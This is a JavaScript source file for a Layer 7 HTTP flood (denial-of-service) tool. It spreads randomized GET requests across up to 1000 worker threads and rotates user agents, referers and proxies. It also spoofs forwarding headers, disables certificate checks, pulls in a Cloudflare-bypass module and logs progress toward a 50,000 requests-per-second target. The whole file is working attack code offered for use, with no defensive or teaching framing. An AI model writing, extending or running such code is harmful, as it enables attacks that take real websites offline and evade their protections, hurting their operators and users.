const axios = require('axios');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const config = require('../config');
const CloudflareBypass = require('./cloudflareBypass');
const crypto = require('crypto');
const { Worker, isMainThread, parentPort } = require('worker_threads');

class Layer7Attack {
    constructor(target, port, duration, threads, proxies = [], personalIPs = [], referers = []) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.threads = Math.min(threads, config.MAX_THREADS);
        this.proxies = proxies;
        this.personalIPs = personalIPs;
        this.referers = referers;
        this.running = true;
        this.requestCount = 0;
        this.successCount = 0;
        this.failCount = 0;
        this.rps = 0;
        this.cfBypass = new CloudflareBypass();
        this.workers = [];
        
        // Mozilla user agents
        this.userAgents = config.MOZILLA_VERSIONS;
        
        // Random paths for variety
        this.paths = [
            '/', '/index.html', '/home', '/about', '/contact',
            '/api', '/v1', '/v2', '/auth', '/login', '/register',
            '/wp-admin', '/wp-content', '/wp-includes',
            '/images', '/css', '/js', '/assets', '/static',
            '/products', '/services', '/blog', '/news', '/article'
        ];
    }
    
    async start() {
        console.log(`[+] Starting Layer7 attack on ${this.target}:${this.port} with ${this.threads} threads`);
        
        // Create worker threads for maximum performance
        const workerCount = Math.min(this.threads, 1000); // Max 1000 workers
        const threadsPerWorker = Math.floor(this.threads / workerCount);
        
        for (let i = 0; i < workerCount; i++) {
            const worker = new Worker(__filename);
            worker.postMessage({
                type: 'start',
                target: this.target,
                port: this.port,
                duration: this.duration,
                threads: threadsPerWorker,
                proxies: this.proxies.slice(i * 100, (i + 1) * 100),
                personalIPs: this.personalIPs,
                referers: this.referers,
                userAgents: this.userAgents,
                paths: this.paths,
                workerId: i
            });
            
            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    this.requestCount += msg.requests;
                    this.successCount += msg.success;
                    this.failCount += msg.fail;
                }
            });
            
            this.workers.push(worker);
        }
        
        // Monitor RPS
        const interval = setInterval(() => {
            this.rps = this.requestCount;
            this.requestCount = 0;
            
            console.log(`[+] RPS: ${this.rps.toLocaleString()}/50,000`);
            
            if (this.rps >= 50000) {
                console.log(`[✅] TARGET 50K RPS ACHIEVED!`);
            }
        }, 1000);
        
        // Stop after duration
        setTimeout(() => {
            this.stop();
            clearInterval(interval);
            
            // Terminate workers
            this.workers.forEach(w => w.terminate());
        }, this.duration * 1000);
    }
    
    stop() {
        this.running = false;
    }
}

// Worker thread code
if (!isMainThread) {
    const axios = require('axios');
    const { HttpsProxyAgent } = require('https-proxy-agent');
    
    parentPort.on('message', async (config) => {
        const {
            target,
            port,
            duration,
            threads,
            proxies,
            personalIPs,
            referers,
            userAgents,
            paths,
            workerId
        } = config;
        
        const startTime = Date.now();
        const endTime = startTime + (duration * 1000);
        let requestCount = 0;
        let successCount = 0;
        let failCount = 0;
        
        // Create HTTP agent with keep-alive
        const agent = new http.Agent({
            keepAlive: true,
            maxSockets: threads,
            maxFreeSockets: threads,
            timeout: 60000
        });
        
        const httpsAgent = new https.Agent({
            keepAlive: true,
            maxSockets: threads,
            maxFreeSockets: threads,
            timeout: 60000,
            rejectUnauthorized: false
        });
        
        // Attack loop
        while (Date.now() < endTime) {
            const promises = [];
            
            for (let i = 0; i < threads; i++) {
                promises.push((async () => {
                    try {
                        const protocol = port === 443 ? 'https' : 'http';
                        const path = paths[Math.floor(Math.random() * paths.length)];
                        const query = `?${crypto.randomBytes(8).toString('hex')}=${Math.random()}`;
                        const url = `${protocol}://${target}:${port}${path}${query}`;
                        
                        // Random headers
                        const headers = {
                            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache'
                        };
                        
                        // Add random referer
                        if (referers.length > 0 && Math.random() > 0.3) {
                            headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
                        }
                        
                        // Add X-Forwarded-For with personal IPs
                        if (personalIPs.length > 0 && Math.random() > 0.5) {
                            headers['X-Forwarded-For'] = personalIPs[Math.floor(Math.random() * personalIPs.length)];
                            headers['X-Real-IP'] = headers['X-Forwarded-For'];
                        }
                        
                        // Use proxy if available
                        let proxyAgent = null;
                        if (proxies.length > 0 && Math.random() > 0.5) {
                            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                            if (proxy.startsWith('socks')) {
                                proxyAgent = new SocksProxyAgent(proxy);
                            } else {
                                proxyAgent = new HttpsProxyAgent(proxy);
                            }
                        }
                        
                        const response = await axios.get(url, {
                            headers,
                            httpAgent: protocol === 'http' ? agent : null,
                            httpsAgent: protocol === 'https' ? httpsAgent : proxyAgent || null,
                            timeout: 3000,
                            maxRedirects: 0,
                            validateStatus: () => true
                        });
                        
                        requestCount++;
                        if (response.status >= 200 && response.status < 500) {
                            successCount++;
                        } else {
                            failCount++;
                        }
                        
                    } catch (error) {
                        failCount++;
                    }
                })());
                
                // Send stats every 100 requests
                if (i % 100 === 0) {
                    parentPort.postMessage({
                        type: 'stats',
                        requests: requestCount,
                        success: successCount,
                        fail: failCount
                    });
                    requestCount = 0;
                    successCount = 0;
                    failCount = 0;
                }
            }
            
            await Promise.all(promises);
        }
    });
}

module.exports = Layer7Attack;
